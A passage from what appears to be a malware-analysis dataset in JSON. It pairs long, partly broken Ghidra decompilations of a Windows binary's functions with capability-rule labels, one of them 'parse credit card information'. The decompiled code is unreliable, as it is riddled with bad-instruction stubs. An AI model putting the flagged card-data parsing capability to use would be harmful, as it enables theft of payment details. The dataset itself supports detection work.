0xffffffffffffffff;\n                            }\n                            goto code_r0x00014006bda2;\n                        }\n                        piVar25 = auStackY584;\n                        if ((*(noname_11[6] + *puVar13 * 2) & 0x20) == 0) goto code_r0x00014006b7e0;\ncode_r0x00014006bdcf:\n                        auStack440[2] = puVar13 + 1;\n                        piVar29 = auStack440;\n                    }\n                    _auStack440 = CONCAT48(0xffffffff, auStack440);\n                    piVar19 = 0xffffffff;\n                    cVar7 = '\\x01';\n                    piVar30 = 0x1;\n                    piVar32 = piVar30;\n                } while (piVar29 == NULL);\n            } while( true );\n        case 0x5b:\n            pcVar18 = auStack280._0_8_ & 0xffffffffffffffab;\n            *pcVar18 = *pcVar18 + pcVar18;\n            *piVar21 = *piVar21 + -0x49;\n            *piVar21 = *piVar21 << (uVar22 & 0x1f);\n            piVar25 = piVar19 + 1;\n            goto code_r0x00014006b705;\n        case 0x5c:\n            goto code_r0x00014006b698;\n        case 0x5d:\n            *auStack280._0_8_ = *auStack280._0_8_ + auStack280._0_8_;\n            piVar19 = uVar14 + 0x14010b898;\n            _auStack440 = auVar35;\n            piStack312 = piVar21;\n            fcn.1400b97f0(piVar19);\n            arg3 = fcn.14002c080(0x140108430);\n            goto code_r0x00014006b698;\n        case 0x5e:\n            *auStack280._0_8_ = *auStack280._0_8_ + cVar7;\ncode_r0x00014006b7e0:\n            while( true ) {\n                iVar10 = uVar15;\n                uVar15 = uVar15 + 1;\n                uVar23 = arg1_01;\n                if ((iVar10 + 1 < 4 & uVar23) == 0) break;\ncode_r0x00014006b782:\n                if (*(*(piVar25 + 0x60) + uVar15) < 5) {\n    // WARNING: Could not recover jumptable at 0x00014006b7a5. Too many branches\n    // WARNING: Treating indirect jump as call\n                    piVar19 = (*(*(*(*(piVar25 + 0x60) + uVar15) * 4 + 0x14010b930) + 0x14010b930))();\n                    return piVar19;\n                }\n                arg1_01 = 0x1;\n            }\n            if ((1 < *(piVar25 + 0x50) & uVar23) == 0) {\n                if (uVar23 != 0) {\n                    uVar15 = *(*(piVar25 + 0xb8) + -0x18);\njoined_r0x00014006c20b:\n                    if (1 < uVar15) {\n                        uVar17 = *(piVar25 + 0x30);\n                        *(piVar25 + -8) = 0x14006c2e5;\n                        uVar15 = fcn.140024dd0(uVar17, 0x30, 0);\n                        if (uVar15 != 0) {\n                            uVar14 = *(*(piVar25 + 0xb8) + -0x18);\n                            if (uVar15 == 0xffffffffffffffff) {\n                                uVar15 = uVar14 - 1;\n                            }\n                            if (uVar15 <= uVar14) {\n                                uVar14 = uVar15;\n                            }\n                            *(piVar25 + -8) = 0x14006c31a;\n                            fcn.14007d8a0(uVar17, 0, uVar14, 0);\n                        }\n                    }\n                    if (*(piVar25 + 0x7e) != '\\0') {\n                        pcVar18 = *(piVar25 + 0xb8);\n                        if (-1 < *(pcVar18 + -8)) {\n                            *(piVar25 + -8) = 0x14006c57c;\n                            fcn.14007b820(*(piVar25 + 0x30));\n                            pcVar18 = *(piVar25 + 0xb8);\n                        }\n                        if (*pcVar18 != '0') {\n                            uVar17 = *(piVar25 + 0x30);\n                            *(piVar25 + -8) = 0x14006c4ca;\n                            fcn.14007d0e0(uVar17);\n                            *(piVar25 + 0x20) = 0x2d;\n                            *(piVar25 + -8) = 0x14006c4e5;\n                            fcn.14007bd00(uVar17, 0, 0, 1);\n                            *(*(piVar25 + 0xb8) + -8) = 0xffffffff;\n                        }\n                    }\n                    if (*(*(piVar25 + 0xb0) + -0x18) != 0) {\n                        cVar7 = arg3;\n                        if (*(piVar25 + 0x7d) != '\\0') {\n                            cVar7 = *(piVar25 + 0x78);\n                        }\n                        *(piVar25 + -8) = 0x14006c24b;\n                        fcn.14007da40(piVar25 + 0xb0, cVar7);\n                        uVar17 = *(puVar28 + 0x18);\n                        arg1_00 = *(puVar28 + 0x10);\n                        *(piVar25 + -8) = 0x14006c25b;\n                        cVar7 = fcn.1400b76a0(arg1_00, uVar17, piVar25 + 0xb0);\n                        if (cVar7 == '\\0') {\n                            **(piVar25 + 0x138) = **(piVar25 + 0x138) | 4;\n                        }\n                    }\n                    if ((*(piVar25 + 0x7d) == '\\0') || (*(puVar28 + 0x58) == arg3)) {\n                        *(piVar25 + -8) = 0x14006c28c;\n                        fcn.14007c220(*(piVar25 + 0x140), *(piVar25 + 0x30));\n                        goto code_r0x00014006bcb4;\n                    }\n                }\n            }\n            else {\n                if (*(piVar25 + 0x7e) == '\\0') {\n                    iVar12 = *(puVar28 + 0x38);\n                }\n                else {\n                    iVar12 = *(puVar28 + 0x48);\n                }\n                iVar10 = *(piVar25 + 0x98);\n                piVar19 = *(piVar25 + 0x90);\n                uVar15 = 1;\n                while( true ) {\n                    bVar34 = iVar10 == -1;\n                    bVar33 = bVar34;\n                    if (((piVar19 != NULL) && (bVar34)) && (bVar33 = false,  piVar19[3] <= piVar19[2])) {\n                        pcVar38 = *(*piVar19 + 0x48);\n                        *(piVar25 + -8) = 0x14006b9a4;\n                        iVar11 = (*pcVar38)(piVar19);\n                        bVar33 = iVar11 == -1;\n                        if (bVar33) {\n                            *(piVar25 + 0x90) = 0;\n                        }\n                    }\n                    piVar19 = *(piVar25 + 0x80);\n                    if ((piVar19 == NULL) || (*(piVar25 + 0x88) != -1)) {\n                        bVar33 = bVar33 ^ *(piVar25 + 0x88) == -1;\n                    }\n                    else if (piVar19[3] <= piVar19[2]) {\n                        pcVar38 = *(*piVar19 + 0x48);\n                        *(piVar25 + -8) = 0x14006c0e4;\n                        iVar11 = (*pcVar38)();\n                        bVar33 = bVar33 ^ iVar11 == -1;\n                        if (iVar11 == -1) {\n                            *(piVar25 + 0x80) = 0;\n                        }\n                    }\n                    if ((*(piVar25 + 0x50) <= uVar15) || (!bVar33)) break;\n                    piVar19 = *(piVar25 + 0x90);\n                    if ((piVar19 == NULL) || (!bVar34)) {\ncode_r0x00014006b933:\n                        if (*(iVar12 + uVar15) != iVar10) goto code_r0x00014006bca9;\n                        piVar19 = *(piVar25 + 0x90);\n                        pcVar18 = piVar19[2];\n                        if (pcVar18 < piVar19[3]) goto code_r0x00014006b953;\n                        pcVar38 = *(*piVar19 + 0x50);\n                        *(piVar25 + -8) = 0x14006c1d9;\n                        (*pcVar38)(piVar19);\n                    }\n                    else {\n                        pcVar18 = piVar19[2];\n                        if (piVar19[3] <= pcVar18) {\n                            pcVar38 = *(*piVar19 + 0x48);\n                            *(piVar25 + -8) = 0x14006c52f;\n                            iVar10 = (*pcVar38)(piVar19);\n                            if (iVar10 == -1) {\n                                *(piVar25 + 0x90) = 0;\n                            }\n                            goto code_r0x00014006b933;\n                        }\n                        if (*(iVar12 + uVar15) != *pcVar18) goto code_r0x00014006bca9;\ncode_r0x00014006b953:\n                        piVar19[2] = pcVar18 + 1;\n                    }\n                    *(piVar25 + 0x98) = 0xffffffff;\n                    uVar15 = uVar15 + 1;\n                    iVar10 = -1;\n                }\n                if (uVar15 == *(piVar25 + 0x50)) {\n                    uVar15 = *(*(piVar25 + 0xb8) + -0x18);\n                    goto joined_r0x00014006c20b;\n                }\n            }\ncode_r0x00014006bca9:\n            **(piVar25 + 0x138) = **(piVar25 + 0x138) | 4;\ncode_r0x00014006bcb4:\n            *(piVar25 + -8) = 0x14006bcc9;\n            cVar7 = fcn.140029dd0(piVar25 + 0x90, piVar25 + 0x80);\n            if (cVar7 != '\\0') {\n                **(piVar25 + 0x138) = **(piVar25 + 0x138) | 2;\n            }\n            puVar3 = *(piVar25 + 0x110);\n            uVar37 = *(piVar25 + 0x94);\n            uVar4 = *(piVar25 + 0x98);\n            uVar5 = *(piVar25 + 0x9c);\n            *puVar3 = *(piVar25 + 0x90);\n            puVar3[1] = uVar37;\n            puVar3[2] = uVar4;\n            puVar3[3] = uVar5;\n            *(piVar25 + -8) = 0x14006bd02;\n            fcn.14007bf20(*(piVar25 + 0xb8) + -0x18);\n            *(piVar25 + -8) = 0x14006bd18;\n            fcn.14007bf20(*(piVar25 + 0xb0) + -0x18);\n            return *(piVar25 + 0x110);\n        case 0x5f:\n        case 0x60:\n        case 0x61:\n        case 0x95:\n        case 0xb7:\n        case 0xc0:\n        case 0xc5:\n            while (!bVar33) {\n                puVar26 = puVar27 + -8;\n                puVar27 = puVar27 + -8;\n                *puVar26 = arg3;\n                *auStack280._0_8_ = *auStack280._0_8_ + cVar7;\n                *0xf1ffeb10 = *0xf1ffeb10 + ((arg1_02 & 0xffffffffffffff00) >> 8);\n                bVar33 = (POPCOUNT(*0xf1ffeb10) & 1U) == 0;\n            }\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x62:\n        case 0x6d:\n        case 0x7c:\n        case 0x84:\n        case 0x96:\n        case 0xb8:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 99:\n        case 0x85:\n        case 0x97:\n        case 0xb9:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 100:\n        case 0x86:\n        case 0x98:\n        case 0xba:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x65:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x66:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x67:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x68:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x69:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x6a:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x6b:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x6c:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x6e:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x6f:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x70:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x71:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x72:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x73:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x74:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x75:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x76:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x77:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x78:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x79:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x7a:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x7b:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x7d:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x7e:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x7f:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x80:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x81:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x82:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x83:\n            *(puVar28 + 0x3cfff57c) = *(puVar28 + 0x3cfff57c) + 1;\n            (*piVar21)();\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x87:\n        case 0x99:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x88:\n        case 0x9a:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x89:\n        case 0x9b:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x8a:\n        case 0x9c:\n        case 0xa3:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x8b:\n        case 0x9d:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x8c:\n        case 0x9e:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x8d:\n        case 0x9f:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x8e:\n        case 0xa0:\n        case 0xfe:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x8f:\n        case 0xa1:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x90:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x91:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x92:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x93:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x94:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xa2:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xa4:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xa5:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xa6:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xa7:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xa8:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xa9:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xaa:\n        case 0xc6:\n        case 0xda:\n        case 0xeb:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xab:\n        case 199:\n        case 0xdb:\n        case 0xec:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xac:\n        case 200:\n        case 0xdc:\n        case 0xed:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xad:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xae:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xaf:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xb0:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xb1:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xb2:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xb3:\n        case 0xd0:\n        case 0xe1:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xb4:\n        case 0xbd:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xb5:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xb6:\n            if (-1 < auStack280._0_8_) {\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            }\n            if (!bVar33) {\n                if (-1 >= auStack280._0_8_) {\n    // WARNING: Bad instruction - Truncating control flow here\n                    halt_baddata();\n                }\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            }\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xbb:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xbc:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xbe:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xbf:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xc1:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xc2:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xc3:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xc4:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xc9:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xca:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xcb:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xcc:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xcd:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xce:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xcf:\n        case 0xe0:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xd1:\n        case 0xe2:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xd2:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xd3:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xd4:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xd5:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xd6:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xd7:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xd8:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xd9:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xdd:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xde:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xdf:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xe3:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xe4:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xe5:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xe6:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xe7:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xe8:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xe9:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xea:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xee:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xef:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xf0:\n        case 0xf5:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xf1:\n        case 0xf6:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xf2:\n        case 0xf7:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xf3:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xf4:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xf8:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xf9:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xfa:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xfb:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xfc:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xfd:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xff:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\ncode_r0x000140063360:\n        piVar32 = CONCAT44(uStack404, uStack408);\n        piVar31 = piVar29;\ncode_r0x00014006305d:\n        piVar29 = piVar29 + 1;\n        arg1_02 = arg3;\n        piVar21 = piVar31;\n    } while( true );\ncode_r0x00014006b698:\n    ppuVar1 = *(*(auStack280._0_8_ + 0x34) + 0x18) + arg3 * 8;\n    puVar28 = *ppuVar1;\n    if (puVar28 == NULL) {\n        puVar20 = fcn.1400bc710(0x70);\n        *(puVar20 + 1) = 0;\n        *puVar20 = 0x140118850;\n        puVar20[2] = 0;\n        puVar20[3] = 0;\n        *(puVar20 + 4) = 0;\n        *(puVar20 + 0x21) = 0;\n        puVar20[5] = 0;\n        puVar20[6] = 0;\n        puVar20[7] = 0;\n        puVar20[8] = 0;\n        puVar20[9] = 0;\n        puVar20[10] = 0;\n        *(puVar20 + 0xb) = 0;\n        *(puVar20 + 0x5c) = 0;\n        *(puVar20 + 0x6f) = 0;\n        fcn.14009fd60(puVar20, piVar19);\n        fcn.1400a38f0(*(auStack280._0_8_ + 0xd0), puVar20, arg3);\n        puVar28 = *ppuVar1;\n    }\n    uVar17 = fcn.14007b890(0, 0);\n    uStack408 = uVar17;\n    uStack404 = uVar17 >> 0x20;\n    piVar25 = auStackY584;\n    if (puVar28[0x20] != 0) {\n        fcn.14007d790(&uStack408, 0x20);\n        piVar25 = auStackY584;\n    }\ncode_r0x00014006b705:\n    *(piVar25 + 0x70) = piVar25 + 0xab;\n    *(piVar25 + -8) = 0x14006b71e;\n    uVar17 = fcn.14007b890(0, 0);\n    *(piVar25 + 0xb8) = uVar17;\n    *(piVar25 + -8) = 0x14006b735;\n    fcn.14007d790(*(piVar25 + 0x30), 0x20);\n    *(piVar25 + 0x7d) = 0;\n    uVar15 = 0;\n    arg3 = NULL;\n    *(piVar25 + 0x40) = puVar28 + 0x65;\n    uVar37 = *(puVar28 + 0x60);\n    *(piVar25 + 0x78) = 0;\n    *(piVar25 + 0xac) = uVar37;\n    *(piVar25 + 0x60) = piVar25 + 0xac;\n    *(piVar25 + 0x50) = 0;\n    *(piVar25 + 0x7e) = 0;\n    *(piVar25 + 0x38) = piVar25 + 0xb0;\n    goto code_r0x00014006b782;\n}\n",
        "token_count": 23058
    },
    "1400679d": {
        "rules": [
            "parse credit card information/3266979fad224c5386fccfb7f2b301b7"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00014000a684) overlaps instruction at (ram,0x00014000a683)\n// \n// WARNING: Control flow encountered bad instruction data\n// WARNING: Removing unreachable block (ram,0x00014000a69e)\n// WARNING: Removing unreachable block (ram,0x00014000a6a3)\n// WARNING: Removing unreachable block (ram,0x00014000a74f)\n// WARNING: Removing unreachable block (ram,0x00014000a754)\n// WARNING: Removing unreachable block (ram,0x00014000a75d)\n// WARNING: Removing unreachable block (ram,0x00014000a6a8)\n// WARNING: Removing unreachable block (ram,0x00014000a6b2)\n// WARNING: Removing unreachable block (ram,0x00014000a718)\n// WARNING: Could not reconcile some variable overlaps\n\nuchar (**) [16] fcn.1400679d0(uchar (**arg1) [16], ulong arg2)\n\n{\n    uint8_t *puVar1;\n    int32_t *piVar2;\n    char cVar3;\n    uint8_t uVar4;\n    uint8_t uVar5;\n    int16_t iVar6;\n    ushort uVar7;\n    int16_t iVar8;\n    uint32_t uVar9;\n    int32_t iVar10;\n    int32_t iVar11;\n    uchar (**arg1_00) [16];\n    uchar (**ppauVar12) [16];\n    uchar *arg_70h;\n    uchar (**ppauVar13) [16];\n    uint64_t uVar14;\n    int64_t iVar15;\n    int64_t iVar16;\n    uchar (**arg1_01) [16];\n    int64_t iVar17;\n    ulong uVar18;\n    ulong uVar19;\n    ulong *puVar20;\n    char *pcVar21;\n    uint8_t uVar24;\n    int32_t *piVar23;\n    uchar (**ppauVar25) [16];\n    uint8_t uVar26;\n    uint8_t uVar28;\n    uchar (**ppauVar29) [16];\n    uint32_t *puVar30;\n    int64_t *piVar31;\n    uint8_t uVar32;\n    uchar (**unaff_RSI) [16];\n    uchar (**arg1_02) [16];\n    uint64_t uVar33;\n    int64_t *piVar34;\n    bool bVar35;\n    uint32_t *in_R8;\n    uchar (*in_R9) [16];\n    uchar (*pauVar36) [16];\n    bool bVar37;\n    bool bVar38;\n    bool bVar39;\n    uchar extraout_XMM0 [16];\n    uchar auVar40 [16];\n    uchar extraout_XMM0_00 [16];\n    uchar in_XMM1 [16];\n    uchar (**in_stack_00000028) [16];\n    uint32_t *in_stack_00000030;\n    uchar (**in_stack_00000038) [16];\n    int64_t in_stack_00000040;\n    uchar (**in_stack_00000048) [16];\n    uint32_t uStackY580;\n    ulong uStackY576;\n    uchar uStackY568;\n    unkbyte7 StackY567;\n    uchar auStackY560 [8];\n    int32_t iStackY552;\n    uchar auStackY544 [8];\n    uchar (**in_stack_fffffffffffffdf8) [16];\n    uint uVar41;\n    uchar (**in_stack_fffffffffffffe08) [16];\n    uchar (**in_stack_fffffffffffffe10) [16];\n    uint64_t in_stack_fffffffffffffe20;\n    uchar (*noname_11) [16];\n    uint32_t uVar42;\n    uint32_t in_stack_fffffffffffffe34;\n    uchar in_stack_fffffffffffffe38 [16];\n    int16_t iStack432;\n    uchar auStack440 [12];\n    uchar auStack440_00 [16];\n    uchar auStack424 [8];\n    ulong uStack416;\n    uint uStack408;\n    uint uStack404;\n    uint16_t uStack400;\n    ushort uStack398;\n    uint uStack396;\n    uint32_t uStack392;\n    uint32_t uStack388;\n    uint16_t uStack384;\n    ushort uStack382;\n    uint32_t uStack380;\n    uint32_t uStack368;\n    uint32_t uStack364;\n    uchar (*pauStack360) [16];\n    int16_t *piStack352;\n    uint uStack344;\n    uint uStack340;\n    uint uStack336;\n    uint uStack332;\n    uint uStack328;\n    uint uStack324;\n    uint uStack320;\n    uint uStack316;\n    uint uStack312;\n    uint uStack308;\n    uint uStack304;\n    uint uStack300;\n    uchar (**ppauStack296) [16];\n    uint uStack288;\n    uint uStack284;\n    uchar auStack280 [16];\n    uint uStack264;\n    uint uStack260;\n    uint uStack256;\n    uint uStack252;\n    uint uStack248;\n    uint uStack244;\n    uint uStack240;\n    uint uStack236;\n    uint uStack232;\n    uint uStack228;\n    uint uStack224;\n    uint uStack220;\n    uchar auStack216 [16];\n    uchar auStack200 [16];\n    uint uStack184;\n    uint uStack180;\n    uint uStack176;\n    uint uStack172;\n    uint8_t *puVar22;\n    uint8_t *puVar27;\n    \n    uVar33 = 0;\n    uStack392 = *in_R8;\n    uStack388 = in_R8[1];\n    uStack380 = in_R8[3];\n    uStack408 = **in_R9;\n    uStack404 = *(*in_R9 + 4);\n    uStack396 = *(*in_R9 + 0xc);\n    uStack384 = in_R8[2];\n    uStack382 = in_R8[2] >> 0x10;\n    uStack400 = *(*in_R9 + 8);\n    uStack398 = *(*in_R9 + 8) >> 0x10;\n    uStackY576 = 0x140067a5d;\n    arg_70h = fcn.1400b9790(in_stack_00000028 + 0x1a);\n    uStackY576 = 0x140067a6a;\n    ppauVar13 = fcn.1400b9850(in_stack_00000028 + 0x1a);\n    uStackY576 = 0x140067a7a;\n    uVar14 = sub.msvcrt.dll_wcslen(in_stack_00000040);\n    pauVar36 = CONCAT44(uStack388, uStack392);\n    uStack368 = 0;\n    uVar42 = 0;\n    piVar34 = CONCAT44(uStack404, uStack408);\n    noname_11 = in_stack_fffffffffffffe20 & 0xffffffffffff0000 | uStack400;\n    ppauVar29 = uStack384;\n    ppauVar12 = arg1;\n    do {\n        bVar37 = ppauVar29 == -1;\n        ppauVar12 = ppauVar12 & 0xffffffffffffff00 | bVar37;\n        auStack424 = in_R9;\n        bVar35 = bVar37;\n        if ((pauVar36 != NULL) && (bVar37)) {\n            if (*pauVar36[1] < *(pauVar36[1] + 8)) {\n                iVar6 = **pauVar36[1];\n            }\n            else {\n                uStackY576 = 0x140068079;\n                iVar6 = (**(**pauVar36 + 0x48))(pauVar36);\n            }\n            if (iVar6 == -1) {\n                uStack392 = 0;\n                uStack388 = 0;\n            }\n            auStack424 = in_R9;\n            bVar35 = iVar6 == -1;\n        }\n        bVar38 = noname_11 == -1;\n        arg1_02 = unaff_RSI & 0xffffffffffffff00 | bVar38;\n        if ((piVar34 != NULL) && (bVar38)) {\n            if (piVar34[2] < piVar34[3]) {\n                iVar6 = *piVar34[2];\n            }\n            else {\n                uStackY576 = 0x140068062;\n                iVar6 = (**(*piVar34 + 0x48))(piVar34);\n            }\n            if (iVar6 == -1) {\n                uStack408 = 0;\n                uStack404 = 0;\n            }\n            bVar39 = iVar6 == -1;\n            if (uVar33 < uVar14) goto code_r0x000140067b11;\ncode_r0x000140067c58:\n            if ((uVar33 == uVar14) && (uVar42 == 0)) goto code_r0x000140067c7f;\ncode_r0x000140067c7a:\n            *in_stack_00000030 = *in_stack_00000030 | 4;\ncode_r0x000140067c7f:\n            *arg1 = uStack392;\n            *(arg1 + 4) = uStack388;\n            *(arg1 + 1) = CONCAT22(uStack382, uStack384);\n            *(arg1 + 0xc) = uStack380;\n            return arg1;\n        }\n        bVar39 = bVar38;\n        if (uVar14 <= uVar33) goto code_r0x000140067c58;\ncode_r0x000140067b11:\n        if (bVar35 == bVar39) goto code_r0x000140067c58;\n        if (uVar42 != 0) goto code_r0x000140067c7a;\n        iVar15 = uVar33 * 2;\n        uStackY576 = 0x140067b47;\n        cVar3 = (**(*ppauVar13)[6])(ppauVar13);\n        if (cVar3 != '%') {\n            uStackY576 = 0x140067b63;\n            iVar15 = (**(*ppauVar13)[1])(ppauVar13);\n            pauVar36 = CONCAT44(uStack388, uStack392);\n            if (iVar15 != '\\0') {\n                piVar34 = CONCAT44(uStack404, uStack408);\n                do {\n                    bVar35 = ppauVar29 == -1;\n                    uVar9 = iVar15 & 0xffffff00;\n                    uVar4 = pauVar36 != NULL && bVar35;\n                    uVar32 = uVar4;\n                    if (pauVar36 != NULL && bVar35) {\n                        if (*pauVar36[1] < *(pauVar36[1] + 8)) {\n                            uVar9 = **pauVar36[1];\n                        }\n                        else {\n                            in_stack_fffffffffffffe34 = 